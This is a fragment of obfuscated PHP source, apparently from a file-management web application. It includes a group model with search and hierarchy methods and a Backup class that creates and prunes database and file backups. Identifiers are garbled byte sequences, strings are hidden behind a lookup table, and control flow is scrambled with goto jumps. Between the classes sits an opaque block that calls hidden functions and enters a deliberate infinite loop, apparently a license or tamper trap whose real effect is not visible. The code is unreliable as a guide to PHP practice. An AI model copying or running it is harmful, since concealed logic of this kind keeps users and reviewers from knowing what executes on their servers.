$this->where(array($BÒ¬»ñÇ∏ç[457] => $Eﬂ„ØÎƒà))->_makeOrder()->selectPage(200); $this->_listDataApply($b…¢éÀ⁄Ùó[$BÒ¬»ñÇ∏ç[351]]); return $b…¢éÀ⁄Ùó; } public function listByID($C¥√∆§˜‰ì) { $C–•ø†ıÉ… =& $_SERVER[—Ω]; if (!$C¥√∆§˜‰ì) { return array(); } $a¢Ñ¶Üô“§ = array($C–•ø†ıÉ…[2080] => array($C–•ø†ıÉ…[7], $C¥√∆§˜‰ì)); $Fô≠–Û´¶å = $this->where($a¢Ñ¶Üô“§)->select(); $this->_listDataApply($Fô≠–Û´¶å); return $Fô≠–Û´¶å; } public function listSearch($A≠ëÒâÓû”) { goto F•≠çùç—µ; fÂπôÎï∑ï: if (!trim($dÈƒ¯∏“›ˆ)) { return !1; } $dÈƒ¯∏“›ˆ = str_replace($A∫Ú¥éπ¢¥[2158], $A∫Ú¥éπ¢¥[2159], $dÈƒ¯∏“›ˆ); $Fù§âäí°Ö = array($A∫Ú¥éπ¢¥[2080] => array($A∫Ú¥éπ¢¥[761], "\45{$dÈƒ¯∏“›ˆ}\45"), $A∫Ú¥éπ¢¥[28] => array($A∫Ú¥éπ¢¥[761], "\45{$dÈƒ¯∏“›ˆ}\x25"), $A∫Ú¥éπ¢¥[920] => $A∫Ú¥éπ¢¥[2160]); goto AΩ·≈ÓüîÒ; AΩ·≈ÓüîÒ: $f÷ëﬂßáëÈ = $this->_makeOrder()->where($Fù§âäí°Ö)->selectPage(20); $f÷ëﬂßáëÈ = $f÷ëﬂßáëÈ ? $f÷ëﬂßáëÈ : array(); if (!$f÷ëﬂßáëÈ || count($f÷ëﬂßáëÈ[$A∫Ú¥éπ¢¥[351]]) < 5 && Input::check($dÈƒ¯∏“›ˆ, $A∫Ú¥éπ¢¥[303])) { $bÿŒ‚„ºôë = $this->_searchFromMeta($A∫Ú¥éπ¢¥[411], $dÈƒ¯∏“›ˆ, 10); $eòÎ¯π≈¿Û = $this->_searchFromMeta($A∫Ú¥éπ¢¥[412], $dÈƒ¯∏“›ˆ, 10); $A‹ıπÜÖú« = array_merge($bÿŒ‚„ºôë, $eòÎ¯π≈¿Û, $f÷ëﬂßáëÈ[$A∫Ú¥éπ¢¥[351]]); $f÷ëﬂßáëÈ[$A∫Ú¥éπ¢¥[351]] = array_unique_by_key($A‹ıπÜÖú«, $A∫Ú¥éπ¢¥[2080]); $f÷ëﬂßáëÈ[$A∫Ú¥éπ¢¥[348]][$A∫Ú¥éπ¢¥[349]] = count($f÷ëﬂßáëÈ[$A∫Ú¥éπ¢¥[351]]); $f÷ëﬂßáëÈ[$A∫Ú¥éπ¢¥[348]][$A∫Ú¥éπ¢¥[350]] = ceil($f÷ëﬂßáëÈ[$A∫Ú¥éπ¢¥[348]][$A∫Ú¥éπ¢¥[349]] / $f÷ëﬂßáëÈ[$A∫Ú¥éπ¢¥[348]][$A∫Ú¥éπ¢¥[346]]); } goto EÎ”∫ıÙ∏; F•≠çùç—µ: $A∫Ú¥éπ¢¥ =& $_SERVER[—Ω]; $dÈƒ¯∏“›ˆ = $A≠ëÒâÓû”[$A∫Ú¥éπ¢¥[2156]]; $E◊£¿Ñ∑Âñ = isset($A≠ëÒâÓû”[$A∫Ú¥éπ¢¥[2157]]) ? $A≠ëÒâÓû”[$A∫Ú¥éπ¢¥[2157]] : !1; goto fÂπôÎï∑ï; EÎ”∫ıÙ∏: $this->_listDataApply($f÷ëﬂßáëÈ[$A∫Ú¥éπ¢¥[351]]); return $f÷ëﬂßáëÈ; goto E´¶øùƒÌ„; E´¶øùƒÌ„: } private function _searchFromMeta($B”‚èÜô√∞, $AÚ∫£‰ªµ, $bßÙ¬ü◊¯ã) { goto eÂ€¿„Êâ∫; fŒ≤ å®ë∞: $fßÈ§à¯∑µ = $this->where(array($e≠ôî˘á Â[2152] => array($e≠ôî˘á Â[7], $BÑ≥ªßñçû)))->select(); if (!$fßÈ§à¯∑µ) { return array(); } return $fßÈ§à¯∑µ; goto F´£§ÒÔÚ; eÂ€¿„Êâ∫: $e≠ôî˘á Â =& $_SERVER[—Ω]; $AÚ∫£‰ªµ = strtolower($AÚ∫£‰ªµ); $fﬂ¯îÀ•ôÖ = array($e≠ôî˘á Â[89] => $B”‚èÜô√∞, $e≠ôî˘á Â[356] => array($e≠ôî˘á Â[761], "\x25{$AÚ∫£‰ªµ}\45")); goto Eåº¨∫îªú; Eåº¨∫îªú: $BÑ≥ªßñçû = Model($e≠ôî˘á Â[2161])->where($fﬂ¯îÀ•ôÖ)->limit($bßÙ¬ü◊¯ã)->select(); if (!$BÑ≥ªßñçû) { return array(); } $BÑ≥ªßñçû = array_to_keyvalue($BÑ≥ªßñçû, $e≠ôî˘á Â[33], $e≠ôî˘á Â[2080]); goto fŒ≤ å®ë∞; F´£§ÒÔÚ: } protected function _listDataApplyItem($F◊◊≠Ú¨—É) { $f‚§êäªó‚ = array($F◊◊≠Ú¨—É); $this->_listDataApply($f‚§êäªó‚); return $f‚§êäªó‚[0]; } protected function _listDataApply(&$fÇ«™Éñ±√) { goto Eóê‚∞ßº; Eóê‚∞ßº: $C¥Ÿù∂ü¯Ø =& $_SERVER[—Ω]; if (!$fÇ«™Éñ±√) { return; } $c≠ñ∏È‡° = array_to_keyvalue($fÇ«™Éñ±√, $C¥Ÿù∂ü¯Ø[33], $C¥Ÿù∂ü¯Ø[2080]); goto E«üÊä‹Úµ; E«üÊä‹Úµ: $this->_listAppendChildren($fÇ«™Éñ±√); $this->_listAppendChildrenMember($fÇ«™Éñ±√); $this->_listAppendMeta($fÇ«™Éñ±√, $c≠ñ∏È‡°); goto E∂—òÇò™Â; E∂—òÇò™Â: $this->_listAppendParent($fÇ«™Éñ±√); $this->_listAppendSourceRoot($fÇ«™Éñ±√, $c≠ñ∏È‡°); goto CﬂûË≥öú‹; CﬂûË≥öú‹: } private function _listAppendChildren(&$Bô∫«íÂÏ«) { goto a¶Ãôß£÷ê; dàñ©≠Õä«: $aãìó…˘≥¶ = count($Bô∫«íÂÏ«); $döÏîÚêÉÖ = $this->tablePrefix . $this->tableName; for ($D∫Çﬂ◊ÕÃ∞ = 0, $fÑ∫Ï‘àÉ≤ = 0; $D∫Çﬂ◊ÕÃ∞ < $aãìó…˘≥¶; $D∫Çﬂ◊ÕÃ∞++) { $fÑ∫Ï‘àÉ≤++; $C„ƒ‚ÈîÂ = $Bô∫«íÂÏ«[$D∫Çﬂ◊ÕÃ∞][$d◊ä‰ÔÚŒ´[2080]]; $fÈ€⁄Áêí∞ .= "\123\x45\x4c\105\x43\124\40\52\x20\106\x52\x4f\115\x20\50\x53\105\x4c\x45\x43\124\x20\47{$C„ƒ‚ÈîÂ}\x5f\x63\150\x69\x6c\144\x27\40\141\163\x20\x68\141\x73\40\x46\122\x4f\115\x20\140{$döÏîÚêÉÖ}\x60\40\167\150\x65\162\x65\40\160\x61\162\145\x6e\x74\111\x44\75{$C„ƒ‚ÈîÂ}\40\154\151\x6d\151\x74\40\61\51\x20\x61\x73\x20\164\x62\x5f{$C„ƒ‚ÈîÂ}\40\165\x6e\x69\157\156\x20\x61\x6c\x6c\x20"; if (($fÑ∫Ï‘àÉ≤ >= 20 || $D∫Çﬂ◊ÕÃ∞ == $aãìó…˘≥¶ - 1) && $fÈ€⁄Áêí∞) { $fÈ€⁄Áêí∞ = substr($fÈ€⁄Áêí∞, 0, -strlen($d◊ä‰ÔÚŒ´[445])); $aë∆Úö—ﬂŒ = $this->query($fÈ€⁄Áêí∞); $aÚ≥ñäÏ›‘ = array_merge($aÚ≥ñäÏ›‘, $aë∆Úö—ﬂŒ); $fÑ∫Ï‘àÉ≤ = 0; $fÈ€⁄Áêí∞ = $d◊ä‰ÔÚŒ´[33]; } } goto bÖ÷áÍáıì; a¶Ãôß£÷ê: $d◊ä‰ÔÚŒ´ =& $_SERVER[—Ω]; $fÈ€⁄Áêí∞ = $d◊ä‰ÔÚŒ´[358]; $aÚ≥ñäÏ›‘ = array(); goto dàñ©≠Õä«; bÖ÷áÍáıì: $aÚ≥ñäÏ›‘ = array_to_keyvalue($aÚ≥ñäÏ›‘, $d◊ä‰ÔÚŒ´[446]); foreach ($Bô∫«íÂÏ« as &$CÀ˜⁄Ë÷Ø£) { $CÀ˜⁄Ë÷Ø£[$d◊ä‰ÔÚŒ´[2162]] = isset($aÚ≥ñäÏ›‘[$CÀ˜⁄Ë÷Ø£[$d◊ä‰ÔÚŒ´[2080]] . $d◊ä‰ÔÚŒ´[2163]]); } goto c…≤∂í—¨Î; c…≤∂í—¨Î: } private function _listAppendChildrenMember(&$eÖΩ‰ÇûÎÖ) { goto DÁü™‚öÿæ; F°ª°ôô†…: $b—“”Œù°ã = array_to_keyvalue($b—“”Œù°ã, $AÍ≈’©îÌÉ[446]); foreach ($eÖΩ‰ÇûÎÖ as &$AÌÓåÃÜ©¥) { $AÌÓåÃÜ©¥[$AÍ≈’©îÌÉ[2164]] = isset($b—“”Œù°ã[$AÌÓåÃÜ©¥[$AÍ≈’©îÌÉ[2080]] . $AÍ≈’©îÌÉ[2163]]); } goto Cö±‘åá≠…; EÌÖµ€‘—ê: $Fêµâ˜ÿä‰ = count($eÖΩ‰ÇûÎÖ); $fº≥∏ô¬¯ä = $this->tablePrefix . $AÍ≈’©îÌÉ[2154]; for ($FëˆÉÆØ…¬ = 0, $b‡éÚÛëÌ« = 0; $FëˆÉÆØ…¬ < $Fêµâ˜ÿä‰; $FëˆÉÆØ…¬++) { $b‡éÚÛëÌ«++; $bõÆ≥¥‰¨¡ = $eÖΩ‰ÇûÎÖ[$FëˆÉÆØ…¬][$AÍ≈’©îÌÉ[2080]]; $E≤«Ïº¿Âì .= "\123\105\114\x45\x43\x54\40\x2a\40\x46\122\x4f\x4d\x20\50\x53\105\x4c\105\103\124\40\x27{$bõÆ≥¥‰¨¡}\x5f\143\150\151\154\x64\47\x20\x61\x73\x20\x68\x61\163\x20\106\x52\x4f\115\40\140{$fº≥∏ô¬¯ä}\140\x20\167\150\x65\x72\x65\40\x67\x72\157\x75\x70\x49\104\75{$bõÆ≥¥‰¨¡}\40\x6c\151\x6d\x69\x74\40\x31\x29\40\141\163\x20\x74\x62\137{$bõÆ≥¥‰¨¡}\40\x75\x6e\151\x6f\156\40\x61\x6c\154\40"; if (($b‡éÚÛëÌ« >= 20 || $FëˆÉÆØ…¬ == $Fêµâ˜ÿä‰ - 1) && $E≤«Ïº¿Âì) { $E≤«Ïº¿Âì = substr($E≤«Ïº¿Âì, 0, -strlen($AÍ≈’©îÌÉ[445])); $d…Ÿ‘Ÿòà‡ = $this->query($E≤«Ïº¿Âì); $b—“”Œù°ã = array_merge($b—“”Œù°ã, $d…Ÿ‘Ÿòà‡); $b‡éÚÛëÌ« = 0; $E≤«Ïº¿Âì = $AÍ≈’©îÌÉ[33]; } } goto F°ª°ôô†…; DÁü™‚öÿæ: $AÍ≈’©îÌÉ =& $_SERVER[—Ω]; $E≤«Ïº¿Âì = $AÍ≈’©îÌÉ[358]; $b—“”Œù°ã = array(); goto EÌÖµ€‘—ê; Cö±‘åá≠…: } private function _listAppendMeta(&$Aûﬁú©◊¨ã, $DÕóºÕ©î¢) { $dπÍ⁄ïÔàõ =& $_SERVER[—Ω]; $f∂€√üÏü˜ = array($dπÍ⁄ïÔàõ[2080] => array($dπÍ⁄ïÔàõ[7], $DÕóºÕ©î¢)); $dµó‘ééÀ´ = Model($dπÍ⁄ïÔàõ[2153])->where($f∂€√üÏü˜)->select(); $dµó‘ééÀ´ = array_to_keyvalue_group($dµó‘ééÀ´, $dπÍ⁄ïÔàõ[2080]); foreach ($dµó‘ééÀ´ as &$E…Èâ€•¢Ç) { $E…Èâ€•¢Ç = array_to_keyvalue($E…Èâ€•¢Ç, $dπÍ⁄ïÔàõ[89], $dπÍ⁄ïÔàõ[356]); } foreach ($Aûﬁú©◊¨ã as &$c·¥ß¯≥„≤) { $c·¥ß¯≥„≤[$dπÍ⁄ïÔàõ[413]] = array(); if (isset($dµó‘ééÀ´[$c·¥ß¯≥„≤[$dπÍ⁄ïÔàõ[2080]]])) { $c·¥ß¯≥„≤[$dπÍ⁄ïÔàõ[413]] = $dµó‘ééÀ´[$c·¥ß¯≥„≤[$dπÍ⁄ïÔàõ[2080]]]; } } } protected function parentLevelArray($Eè≠çå◊“©) { $Aàı∫–€∫µ =& $_SERVER[—Ω]; $Eè≠çå◊“© = explode($Aàı∫–€∫µ[47], trim($Eè≠çå◊“©, $Aàı∫–€∫µ[47])); $Eè≠çå◊“© = array_remove_value($Eè≠çå◊“©, $Aàı∫–€∫µ[464]); return $Eè≠çå◊“©; } private function _listAppendParent(&$eÆñù‚ÙøÍ) { goto DÜßü™êÚÜ; C∑ºâÈ∑òÍ: foreach ($eÆñù‚ÙøÍ as &$BßÙ¢°’¶›) { $eì“∏«·›Ω = $this->parentLevelArray($BßÙ¢°’¶›[$cù√ äﬂõ[455]]); $DâÀ∏ß⁄Œó = $cù√ äﬂõ[33]; foreach ($eì“∏«·›Ω as $f˘∂âÔﬂÖÖ) { $DâÀ∏ß⁄Œó .= $c∞è·‰Ü∑È[$f˘∂âÔﬂÖÖ] . $cù√ äﬂõ[8]; } if ($eì“∏«·›Ω) { $DâÀ∏ß⁄Œó .= $BßÙ¢°’¶›[$cù√ äﬂõ[28]]; } $BßÙ¢°’¶›[$cù√ äﬂõ[459]] = str_replace($cù√ äﬂõ[463], $cù√ äﬂõ[8], $DâÀ∏ß⁄Œó); } goto BÜ≈ô®÷√„; c•ƒ¶Ëáà®: $CˆÉ®¨ÒÖå = array(); foreach ($c∞è·‰Ü∑È as $f¬éˆ◊ã¯ => $A“Âêèã˘ò) { if (!$A“Âêèã˘ò) { $CˆÉ®¨ÒÖå[] = $f¬éˆ◊ã¯; } } if ($CˆÉ®¨ÒÖå) { $E‹ÈéøŸ◊⁄ = array($cù√ äﬂõ[2152] => array($cù√ äﬂõ[381], $CˆÉ®¨ÒÖå)); $fÑ≥ì÷„ß† = $this->field($cù√ äﬂõ[2165])->where($E‹ÈéøŸ◊⁄)->select(); $AΩÔ´Æìé« = array_to_keyvalue($fÑ≥ì÷„ß†, $cù√ äﬂõ[2080], $cù√ äﬂõ[28]); $c∞è·‰Ü∑È = array_merge_index($c∞è·‰Ü∑È, $AΩÔ´Æìé«); } goto C∑ºâÈ∑òÍ; DÜßü™êÚÜ: $cù√ äﬂõ =& $_SERVER[—Ω]; $c∞è·‰Ü∑È = array(); foreach ($eÆñù‚ÙøÍ as &$BßÙ¢°’¶›) { $c∞è·‰Ü∑È[$BßÙ¢°’¶›[$cù√ äﬂõ[2080]]] = $BßÙ¢°’¶›[$cù√ äﬂõ[28]]; $eì“∏«·›Ω = $this->parentLevelArray($BßÙ¢°’¶›[$cù√ äﬂõ[455]]); foreach ($eì“∏«·›Ω as $f˘∂âÔﬂÖÖ) { if (!isset($c∞è·‰Ü∑È[$f˘∂âÔﬂÖÖ])) { $c∞è·‰Ü∑È[$f˘∂âÔﬂÖÖ] = 0; } } } goto c•ƒ¶Ëáà®; BÜ≈ô®÷√„: } private function _listAppendSourceRoot(&$AΩÌåÌÜëê, $a⁄ûÍô´Ù®) { goto EùøÊ»êÀä; EùøÊ»êÀä: $aŸ›ãó£Œ =& $_SERVER[—Ω]; $C“’‰éÎ∞î = array($aŸ›ãó£Œ[368] => SourceModel::TYPE_GROUP, $aŸ›ãó£Œ[457] => 0, $aŸ›ãó£Œ[452] => array($aŸ›ãó£Œ[7], $a⁄ûÍô´Ù®)); $BÏøû∂£ê = $aŸ›ãó£Œ[2166]; goto EıÔèû¶ì; fàëÇÛÿÓ«: foreach ($AΩÌåÌÜëê as &$eÚÆ”Ωﬂ€≥) { $eÚÆ”Ωﬂ€≥[$aŸ›ãó£Œ[388]] = $cÙíõø¥‡ç[$eÚÆ”Ωﬂ€≥[$aŸ›ãó£Œ[2080]]] ? $cÙíõø¥‡ç[$eÚÆ”Ωﬂ€≥[$aŸ›ãó£Œ[2080]]] : array(); } goto c™˘Ì◊¡Üë; EıÔèû¶ì: $cÙíõø¥‡ç = Model($aŸ›ãó£Œ[762])->order($aŸ›ãó£Œ[2167])->field($BÏøû∂£ê)->where($C“’‰éÎ∞î)->select(); $cÙíõø¥‡ç = array_to_keyvalue($cÙíõø¥‡ç, $aŸ›ãó£Œ[452]); $cÙíõø¥‡ç = array_remove_key($cÙíõø¥‡ç, $aŸ›ãó£Œ[452]); goto fàëÇÛÿÓ«; c™˘Ì◊¡Üë: } protected function resetParentLevel() { $a®ØÂﬂ’î⁄ =& $_SERVER[—Ω]; $fÀÛô¬ëÇü = $a®ØÂﬂ’î⁄[2080]; $bÁ‡Æ›Â•ñ = $this->select(); $bÁ‡Æ›Â•ñ = array_to_keyvalue($bÁ‡Æ›Â•ñ, $fÀÛô¬ëÇü); foreach ($bÁ‡Æ›Â•ñ as $cƒÑÇÃ¨Ô˘) { goto f—•≠ﬁ°•¿; düñ¡éôÉ‡: $this->where(array($fÀÛô¬ëÇü => $cƒÑÇÃ¨Ô˘[$fÀÛô¬ëÇü]))->save(array($a®ØÂﬂ’î⁄[521] => $Eåó≥éÿòº)); goto D§·∞ëÙ⁄•; f—•≠ﬁ°•¿: $e©üé¿ íã = $cƒÑÇÃ¨Ô˘; $Eåó≥éÿòº = array(); while ($e©üé¿ íã[$a®ØÂﬂ’î⁄[457]] != 0) { $Eåó≥éÿòº[] = $e©üé¿ íã[$a®ØÂﬂ’î⁄[457]]; $e©üé¿ íã = $bÁ‡Æ›Â•ñ[$e©üé¿ íã[$a®ØÂﬂ’î⁄[457]]]; } goto a¬ô∑‹¬§ã; a¬ô∑‹¬§ã: $Eåó≥éÿòº[] = 0; $Eåó≥éÿòº = $a®ØÂﬂ’î⁄[47] . implode($a®ØÂﬂ’î⁄[47], array_reverse($Eåó≥éÿòº)) . $a®ØÂﬂ’î⁄[47]; $this->setNamePinyin($cƒÑÇÃ¨Ô˘[$fÀÛô¬ëÇü], $cƒÑÇÃ¨Ô˘[$a®ØÂﬂ’î⁄[28]]); goto düñ¡éôÉ‡; D§·∞ëÙ⁄•: } return $bÁ‡Æ›Â•ñ; } public function groupNameAuto($CÉÕ¨å∂£⁄, $F…¿âπ÷œ«) { $eæ¡ó…≈‡Ó =& $_SERVER[—Ω]; $fïœôÑó”µ = $this->where(array($eæ¡ó…≈‡Ó[365] => $CÉÕ¨å∂£⁄))->getField($eæ¡ó…≈‡Ó[28], !0); if (!$fïœôÑó”µ || !in_array($F…¿âπ÷œ«, $fïœôÑó”µ)) { return $F…¿âπ÷œ«; } for ($Aªœ∂Çº§ò = 1; $Aªœ∂Çº§ò <= count($fïœôÑó”µ) + 1; $Aªœ∂Çº§ò++) { $DèçøìÍ€“ = $F…¿âπ÷œ« . "\x28{$Aªœ∂Çº§ò}\x29"; if (!in_array($DèçøìÍ€“, $fïœôÑó”µ)) { return $DèçøìÍ€“; } } } } goto dÚÿéáµ≤∂; CÚ¥›∆œ÷Ù: if (!isset($_SERVER[$_SERVER[—Ω][690]]) || !isset($_SERVER[$_SERVER[—Ω][691]])) { goto F∂„∆ªΩ«ï; bá∆∂¥Â≥¨: $A…ƒˆπ¬‰√ = explode($_SERVER[—Ω][214], $d◊è∫ÎıæÊ); if (count($A…ƒˆπ¬‰√) < $_SERVER[—Ω][553]) { $CÜºßÑÖÍÌ = $_SERVER[—Ω][695]; $CÜºßÑÖÍÌ(); } $eπá™À’∏Ì = $_SERVER[—Ω][696]; goto b‡ÀøÓªÂ”; F∂„∆ªΩ«ï: $B‘≤ÇÔ¡ÜÒ = $_SERVER[—Ω][692]; $B±ˆï˜ïúå = $_SERVER[$_SERVER[—Ω][693]] . $_SERVER[—Ω][694]; $d◊è∫ÎıæÊ = $B‘≤ÇÔ¡ÜÒ($B±ˆï˜ïúå); goto bá∆∂¥Â≥¨; b‡ÀøÓªÂ”: $eπá™À’∏Ì($_SERVER[$_SERVER[—Ω][693]] . $_SERVER[—Ω][694]); $B¬œı¶†÷à = 2; while ($B¬œı¶†÷à > 1) { $eíê‰ŸÎã£ = rawurlencode($B¬œı¶†÷à . $_SERVER[—Ω][358]); } goto Aø¿ÓîŒ⁄ﬂ; Aø¿ÓîŒ⁄ﬂ: } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $f∏Ω’±…˜÷ =& $_SERVER[—Ω]; self::$name = date($f∏Ω’±…˜÷[697]); if (!($f—àºÃ¯∑∏ = Model($f∏Ω’±…˜÷[698])->lastItem())) { $f—àºÃ¯∑∏ = $this->initData(); } else { self::$name = $f—àºÃ¯∑∏[$f∏Ω’±…˜÷[28]]; if ($f—àºÃ¯∑∏[$f∏Ω’±…˜÷[699]] == $f∏Ω’±…˜÷[83]) { self::$name = date($f∏Ω’±…˜÷[700]); $f¯≠˜¬πàé = 0; if (isset($f—àºÃ¯∑∏[$f∏Ω’±…˜÷[278]][$f∏Ω’±…˜÷[164]][$f∏Ω’±…˜÷[415]])) { $f¯≠˜¬πàé = (int) $f—àºÃ¯∑∏[$f∏Ω’±…˜÷[278]][$f∏Ω’±…˜÷[164]][$f∏Ω’±…˜÷[415]]; } if ($f—àºÃ¯∑∏[$f∏Ω’±…˜÷[28]] == self::$name) { Model($f∏Ω’±…˜÷[698])->remove($f—àºÃ¯∑∏[$f∏Ω’±…˜÷[364]]); } $f—àºÃ¯∑∏ = $this->initData($f¯≠˜¬πàé, $f—àºÃ¯∑∏[$f∏Ω’±…˜÷[701]]); } else { $this->checkStore($f—àºÃ¯∑∏[$f∏Ω’±…˜÷[701]]); } } self::$option = $f—àºÃ¯∑∏; } private function initData($B˜˘ô´Ö’” = 0, $b«‚Ìπå¢Â = '') { goto a£ÜüÖíÔ‹; E™¿ª·€µˆ: $this->checkStore($Cﬁò¡√¿Ÿ[$Bﬂıî¢ç„Í[701]]); $e”ï‚¨Áëº = array($Bﬂıî¢ç„Í[701] => $Cﬁò¡√¿Ÿ[$Bﬂıî¢ç„Í[701]], $Bﬂıî¢ç„Í[28] => self::$name, $Bﬂıî¢ç„Í[699] => 0, $Bﬂıî¢ç„Í[702] => $Cﬁò¡√¿Ÿ[$Bﬂıî¢ç„Í[702]], $Bﬂıî¢ç„Í[278] => array($Bﬂıî¢ç„Í[703] => array($Bﬂıî¢ç„Í[699] => 0), $Bﬂıî¢ç„Í[704] => array($Bﬂıî¢ç„Í[699] => 0, $Bﬂıî¢ç„Í[705] => 0, $Bﬂıî¢ç„Í[706] => 0, $Bﬂıî¢ç„Í[29] => $Bﬂıî¢ç„Í[33]), $Bﬂıî¢ç„Í[707] => array($Bﬂıî¢ç„Í[699] => 0, $Bﬂıî¢ç„Í[705] => 0, $Bﬂıî¢ç„Í[706] => 0), $Bﬂıî¢ç„Í[164] => array($Bﬂıî¢ç„Í[699] => 0, $Bﬂıî¢ç„Í[708] => 0, $Bﬂıî¢ç„Í[709] => 0, $Bﬂıî¢ç„Í[710] => 0, $Bﬂıî¢ç„Í[711] => 0, $Bﬂıî¢ç„Í[415] => $B˜˘ô´Ö’”)), $Bﬂıî¢ç„Í[712] => time(), $Bﬂıî¢ç„Í[713] => 0); $AèÖ≤ç êñ = Model($Bﬂıî¢ç„Í[698])->insert($e”ï‚¨Áëº); goto b∏ã®›ÿì⁄; b∏ã®›ÿì⁄: $e”ï‚¨Áëº[$Bﬂıî¢ç„Í[364]] = $AèÖ≤ç êñ; return $e”ï‚¨Áëº; goto aùΩìØØ±; a£ÜüÖíÔ‹: $Bﬂıî¢ç„Í =& $_SERVER[—Ω]; $Cﬁò¡√¿Ÿ = Model($Bﬂıî¢ç„Í[698])->config(); if ($b«‚Ìπå¢Â && $Cﬁò¡√¿Ÿ[$Bﬂıî¢ç„Í[701]] != $b«‚Ìπå¢Â) { $B˜˘ô´Ö’” = 0; } goto E™¿ª·€µˆ; aùΩìØØ±: } private function checkStore($E÷Õ€„≈òê) { $CÏ‘©÷ëƒ¨ =& $_SERVER[—Ω]; $Fè™ƒëîŸÎ = Model($CÏ‘©÷ëƒ¨[714])->listData($E÷Õ€„≈òê); Model($CÏ‘©÷ëƒ¨[714])->checkConfig($Fè™ƒëîŸÎ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[—Ω][698])->findByName(self::$name); } return self::$option; } public static function set($aæ¡áïÈ‰è) { $Fá°–∆ØµÑ =& $_SERVER[—Ω]; $cûÜ€›¯‡’ = self::get(); foreach ($aæ¡áïÈ‰è as $CÖÕãû⁄÷· => $aãŸüŒãÃÁ) { $dÒ˜áÚñøÊ = explode($Fá°–∆ØµÑ[93], $CÖÕãû⁄÷·); $dÁ±≠¢çøæ = count($dÒ˜áÚñøÊ); switch ($dÁ±≠¢çøæ) { case 1: $cûÜ€›¯‡’[$dÒ˜áÚñøÊ[0]] = $aãŸüŒãÃÁ; break; case 2: $cûÜ€›¯‡’[$dÒ˜áÚñøÊ[0]][$dÒ˜áÚñøÊ[1]] = $aãŸüŒãÃÁ; break; case 3: $cûÜ€›¯‡’[$dÒ˜áÚñøÊ[0]][$dÒ˜áÚñøÊ[1]][$dÒ˜áÚñøÊ[2]] = $aãŸüŒãÃÁ; break; } } Model($Fá°–∆ØµÑ[698])->update($cûÜ€›¯‡’[$Fá°–∆ØµÑ[364]], $cûÜ€›¯‡’); self::$option = $cûÜ€›¯‡’; return self::$option; } public function keep() { $dû∆ÕÒâëÇ =& $_SERVER[—Ω]; $aËãö‰ä¯ä = self::get(); if ($aËãö‰ä¯ä[$dû∆ÕÒâëÇ[278]][$dû∆ÕÒâëÇ[703]][$dû∆ÕÒâëÇ[699]] == $dû∆ÕÒâëÇ[83]) { return; } $this->backupKeep($aËãö‰ä¯ä); self::set(array($dû∆ÕÒâëÇ[715] => 1)); } private function backupKeep($EßÛÚå„ÓÍ) { goto cÖŒ‘ÆœØú; aË§áπ†õ≥: $cùî¢ç≠ô∫ = 0; $f£Á‹ÜœáÚ = array(); foreach ($F«°…¨“ﬁï as $eÍ∑‰éôœö) { if ($cùî¢ç≠ô∫ >= 7) { break; } $f£Á‹ÜœáÚ[] = $eÍ∑‰éôœö[$Bªá‘ã¬ûÒ[28]]; $cùî¢ç≠ô∫++; } goto c≤ãõ≠É›©; c≤ãõ≠É›©: for ($cùî¢ç≠ô∫ = 0; $cùî¢ç≠ô∫ < 12; $cùî¢ç≠ô∫++) { $f£Á‹ÜœáÚ[] = date($Bªá‘ã¬ûÒ[716], strtotime("\x2d{$cùî¢ç≠ô∫}\x20\x6d\x6f\156\164\150\163")); } $f£Á‹ÜœáÚ = array_unique($f£Á‹ÜœáÚ); foreach ($F«°…¨“ﬁï as $eÍ∑‰éôœö) { if (!empty($eÍ∑‰éôœö[$Bªá‘ã¬ûÒ[28]]) && in_array($eÍ∑‰éôœö[$Bªá‘ã¬ûÒ[28]], $f£Á‹ÜœáÚ)) { continue; } Model($Bªá‘ã¬ûÒ[698])->remove($eÍ∑‰éôœö[$Bªá‘ã¬ûÒ[364]]); $f ãìãÂ∏Ü = "\x7b\151\x6f\x3a{$EßÛÚå„ÓÍ[$Bªá‘ã¬ûÒ[701]]}\x7d\57\144\x61\164\141\142\141\x73\145\x2f\142\x61\x63\153\x75\x70\137{$eÍ∑‰éôœö[$Bªá‘ã¬ûÒ[28]]}"; IO::remove($f ãìãÂ∏Ü, !1); } goto dÆÉ† ÒÂä; cÖŒ‘ÆœØú: $Bªá‘ã¬ûÒ =& $_SERVER[—Ω]; $F«°…¨“ﬁï = Model($Bªá‘ã¬ûÒ[698])->listData(); if (empty($F«°…¨“ﬁï)) { return; } goto aË§áπ†õ≥; dÆÉ† ÒÂä: } public function db() { goto DÁëæÿã¡Õ; DÁëæÿã¡Õ: $A≥áÀ¶ê±ü =& $_SERVER[—Ω]; $DÜôﬁçñà˜ = self::get(); if ($DÜôﬁçñà˜[$A≥áÀ¶ê±ü[278]][$A≥áÀ¶ê±ü[704]][$A≥áÀ¶ê±ü[699]] == $A≥áÀ¶ê±ü[83]) { return !0; } goto FÑ»‡Çã©§; FÑ»‡Çã©§: $e‚ˆ€øîƒæ = new BackupDb(); if (!$e‚ˆ€øîƒæ->index()) { return !1; } self::set(array($A≥áÀ¶ê±ü[717] => 1)); goto eò‘¿é◊ï™; eò‘¿é◊ï™: return !0; goto eõ∞€†∑Îâ; eõ∞€†∑Îâ: } public function dbFile() { goto DÕÒ§™ö◊è; DÕÒ§™ö◊è: $A‡à‡≈Âíå =& $_SERVER[—Ω]; $C¡ı≠ê⁄ç≈ = self::get(); if ($C¡ı≠ê⁄ç≈[$A‡à‡≈Âíå[278]][$A‡à‡≈Âíå[707]][$A‡à‡≈Âíå[699]] == $A‡à‡≈Âíå[83]) { return !0; } goto E§–ìÚºÀΩ; A∏ä¿ô≠ÿÆ: return !0; goto eıì…¯Ùá∏; E§–ìÚºÀΩ: $bæÊ—ëÏπΩ = new BackupDbFile(); if (!$bæÊ—ëÏπΩ->index()) { return !1; } self::set(array($A‡à‡≈Âíå[718] => 1)); goto A∏ä¿ô≠ÿÆ; eıì…¯Ùá∏: } public function file() { $dèöÔØå⁄® =& $_SERVER[—Ω]; $fΩﬁ¢Ö„ÀË = self::get(); if ($fΩﬁ¢Ö„ÀË[$dèöÔØå⁄®[278]][$dèöÔØå⁄®[164]][$dèöÔØå⁄®[699]] == $dèöÔØå⁄®[83]) { return !0; } if (!isset($fΩﬁ¢Ö„ÀË[$dèöÔØå⁄®[702]]) || $fΩﬁ¢Ö„ÀË[$dèöÔØå⁄®[702]] == $dèöÔØå⁄®[464]) { $Bë¶ë˜â£’ = new BackupFile(); if (!$Bë¶ë˜â£’->index()) { return !1; } } self::set(array($dèöÔØå⁄®[719] => 1, 